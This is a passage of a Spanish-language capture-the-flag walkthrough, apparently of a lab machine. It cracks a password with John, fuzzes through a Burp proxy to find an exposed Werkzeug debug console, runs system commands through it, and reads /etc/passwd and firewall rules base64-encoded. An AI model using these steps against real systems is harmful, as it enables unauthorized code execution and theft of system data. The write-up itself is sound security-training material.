## Evaluacion de vulnerabilidades {-}

### John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
```

Ya hemos crackeado la contraseña. Intentamos conectar por ssh pero no funciona.

Pues ponemos las credenciales en el foxyproxy.

### Conectamos por la web a la 127.0.0.1 {-}

Hay una pagina que propone shortear una url. Vamos a testear el servicio web

1. Nos creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```
1. En el servicio intentamos shortear la url `http://10.10.14.20/test`

No hace nada. Vemos en el codigo fuente que hay un recurso `/list`. La idea aqui es aplicar fuzzing. Como tenemos que pasar
por un proxy, vamos a utilizar **Burp** para conectar el fuzzer con el proxy.

1. Creamos un Proxy Server.

    - En la pagina **User options** de Burp, creamos un proxy server

        ```{r, echo = FALSE, fig.cap="BurpSuite: create proxy server", out.width="90%"}
            knitr::include_graphics("images/burp-create-proxy-server.png")
        ```

1. Añadir el puerto 80 para utilizar **curl** y **wfuzz**

    ```{r, echo = FALSE, fig.cap="BurpSuite: create proxy server 1", out.width="90%"}
        knitr::include_graphics("images/burp-add-port-80-1.png")
    ```

    ```{r, echo = FALSE, fig.cap="BurpSuite: create proxy server 2", out.width="90%"}
        knitr::include_graphics("images/burp-add-port-80-2.png")
    ```

1. Testeamos con **curl**

    ```bash
    curl -s http://127.0.0.1 | html2text
    ```

Ya no nos pone el mensaje de error `Conexion reusada`, quiere decir que el server proxy que hemos creado con
BurpSuite funciona. Ya podemos aplicar fuzzing.

### WFUZZ {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt http://127.0.0.1/FUZZ
```

Encontramos el recurse `/console`

### Consola Interactiva {-}

Estamos en frente de una consola interactiva donde se puede ejecutar code en python

```python
import os

os.system('whoami')
#Output
0
```

En este caso la respuesta al lado del servidor es `0`. Suponemos que la respuesta es el codigo de estado. Utilizamos la funccion
`os.popen(<command>).read()` para ver el output normal.

```python
os.popen('whoami').read()
#Output
'Werkzeug'
```

El comando funcionna. Ahora intentamos **pingear** nuestra maquina de atacante.

1. en la maquina de atacante

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. En la consola interactiva python

    ```python
    os.system('ping -c 1 10.10.14.20')
    ```

Recibimos la trasa ICMP.

Intentamos recuperar ficheros de la maquina victima antes de entablar una reverse shell. Como el comando
`os.popen('cat /etc/passwd').read()` nos retorna el resultado en una linea y que no es muy legible, S4vi nos
recomienda encriptar la respuesta en base 64 para despues decodificarlo en la maquina de atacante con el comando
`echo "<cadena codificada en base64>" | base64 -d; echo`

```python
os.popen('base64 -w 0 /etc/passwd').read()
os.popen('base64 -w 0 /etc/iptables/rules.v4').read()
```

El iptables nos muestra con la linea `-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP` que la maquina victima nos
va a rechazar todas las comunicaciones por **TCP**. Es por esta razon que no hemos creado directamente una reverse shell.
 